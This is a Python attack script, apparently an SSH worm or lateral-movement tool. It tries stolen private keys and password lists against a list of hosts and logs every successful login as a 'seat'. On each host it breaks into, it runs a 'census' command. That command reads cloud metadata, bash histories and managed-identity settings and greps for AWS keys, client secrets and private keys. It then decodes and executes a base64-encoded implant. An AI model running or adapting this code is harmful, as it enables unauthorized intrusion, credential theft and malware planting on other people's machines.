import os,socket,subprocess,sys,time,base64,tarfile,json
import paramiko
OUT=open('ulres.txt','a',buffering=1)
def P(*a):
    s=' '.join(str(x) for x in a)
    print('ULR '+s,flush=True); OUT.write(s+'\n')
P('EGRESS', os.popen('curl -s -m 10 https://ipinfo.io/ip').read().strip(), os.popen('uname -a').read().strip())
os.makedirs('/tmp/keys',exist_ok=True)
with tarfile.open('/tmp/kb.tgz') as t:
    for m in t.getmembers():
        if m.isfile():
            n=os.path.basename(m.name).rstrip('_')
            open('/tmp/keys/'+n,'wb').write(t.extractfile(m).read())
for f in os.listdir('/tmp/keys'): os.chmod('/tmp/keys/'+f,0o600)
KEYS=sorted('/tmp/keys/'+f for f in os.listdir('/tmp/keys'))
P('KEYS',len(KEYS))
HOSTS=[]
for line in os.environ['HOSTS'].strip().splitlines():
    p=line.split()
    if len(p)>=2: HOSTS.append((p[0],p[1]))
P('HOSTS',len(HOSTS))
PWS=[x.strip() for x in os.environ['PWS'].splitlines() if x.strip()]
USERS=['t19','ubuntu','azureuser','admin','root']
def banner(ip,t=5):
    try:
        s=socket.create_connection((ip,22),timeout=t); s.settimeout(4)
        b=s.recv(160); s.close(); return b.decode('utf-8','replace').strip()
    except Exception: return None
CENSUS=("id; hostname -I; hostname; uname -a; cat /proc/1/cgroup 2>/dev/null; "
 "nvidia-smi -L 2>/dev/null; nvidia-smi --query-gpu=index,name,memory.total,serial,uuid,driver_version --format=csv 2>/dev/null; "
 "ls -la /root/.ssh /home/*/.ssh 2>/dev/null; "
 "curl -s -m 6 -H Metadata:true 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' | head -c 900; echo; "
 "for f in /root/.bash_history /home/*/.bash_history /etc/environment /var/lib/waagent/ManagedIdentity-Settings; do echo \"== $f\"; head -c 1200 $f 2>/dev/null; done; "
 "grep -raoE 'AKIA[0-9A-Z]{16}|LTAI[0-9A-Za-z]{12,}|AKID[A-Za-z0-9]{13,}|client_secret|BEGIN (RSA|OPENSSH) PRIVATE KEY' /root /home /etc 2>/dev/null | head -20")
PLANTB64=os.environ['PLANTB64']
PLANTCMD="echo "+PLANTB64+" | base64 -d > /tmp/ulp.sh; chmod +x /tmp/ulp.sh; bash /tmp/ulp.sh"
def run(cmd,tmo=60):
    try:
        r=subprocess.run(cmd,capture_output=True,timeout=tmo); return r.returncode,(r.stdout+r.stderr).decode('utf-8','replace')
    except Exception as e: return -1,str(e)
def exec_on(c,cmd,tmo=240):
    try:
        si,so,se=c.exec_command(cmd,timeout=tmo)
        return (so.read().decode('utf-8','replace')+se.read().decode('utf-8','replace'))
    except Exception as ex: return 'EXEC-ERR '+str(ex)
def try_keys(ip,user):
    for kf in KEYS:
        try:
            c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            c.connect(ip,port=22,username=user,key_filename=kf,timeout=8,banner_timeout=15,auth_timeout=15,allow_agent=False,look_for_keys=False)
            return c,kf
        except paramiko.AuthenticationException: pass
        except Exception: pass
    return None,None
def try_pw(ip,user,pw):
    rc,out=run(['sshpass','-p',pw,'ssh','-o','StrictHostKeyChecking=no','-o','UserKnownHostsFile=/dev/null','-o','ConnectTimeout=10','-o','PreferredAuthentications=password,keyboard-interactive','-o','PubkeyAuthentication=no','-o','NumberOfPasswordPrompts=1',user+'@'+ip,'id; hostname -I'],40)
    return rc==0,out
DEADLINE=time.time()+int(os.environ.get('LOOPMIN','46'))*60
tried=set(); seats=[]; cycle=0
while time.time()<DEADLINE:
    cycle+=1; opens=[]
    for name,ip in HOSTS:
        if ip in tried: continue
        b=banner(ip,4)
        if b: opens.append((name,ip,b)); P('OPEN',name,ip,repr(b))
    P('CYCLE',cycle,'newopens',len(opens),'remaining',len([1 for n,i in HOSTS if i not in tried]),'t',time.strftime('%H:%M:%SZ',time.gmtime()))
    for name,ip,b in opens:
        tried.add(ip); got=False
        for user in USERS:
            c,kf=try_keys(ip,user)
            if c:
                P('AUTH_OK_KEY',name,ip,user,os.path.basename(kf))
                P('CENSUS',name,ip,repr(exec_on(c,CENSUS)[:3000]))
                P('PLANT',name,ip,repr(exec_on(c,PLANTCMD,300)[:2500]))
                seats.append((name,ip,user,os.path.basename(kf))); c.close(); got=True; break
            if ('password' in b.lower()) or ('keyboard' in b.lower()):
                for pw in PWS:
                    ok,out=try_pw(ip,user,pw)
                    if ok:
                        P('AUTH_OK_PW',name,ip,user,'idx%d'%PWS.index(pw),repr(out[:400]))
                        P('CENSUS_PW',name,ip,repr(run(['sshpass','-p',pw,'ssh','-o','StrictHostKeyChecking=no','-o','UserKnownHostsFile=/dev/null','-o','ConnectTimeout=10','-o','PreferredAuthentications=password,keyboard-interactive','-o','PubkeyAuthentication=no',user+'@'+ip,CENSUS],90)[1][:3000]))
                        P('PLANT_PW',name,ip,repr(run(['sshpass','-p',pw,'ssh','-o','StrictHostKeyChecking=no','-o','UserKnownHostsFile=/dev/null','-o','ConnectTimeout=10','-o','PreferredAuthentications=password,keyboard-interactive','-o','PubkeyAuthentication=no',user+'@'+ip,"echo "+PLANTB64+" | base64 -d > /tmp/ulp.sh; bash /tmp/ulp.sh"],300)[1][:2500]))
                        seats.append((name,ip,user,'pw%d'%PWS.index(pw))); got=True; break
                    time.sleep(1)
            if got: break
        if not got: P('NOAUTH',name,ip,'keys=%d pw=%d'%(len(KEYS),len(PWS)))
    time.sleep(90 if not opens else 10)
P('DONE seats=%d'%len(seats))
for s in seats: P('SEAT',s)
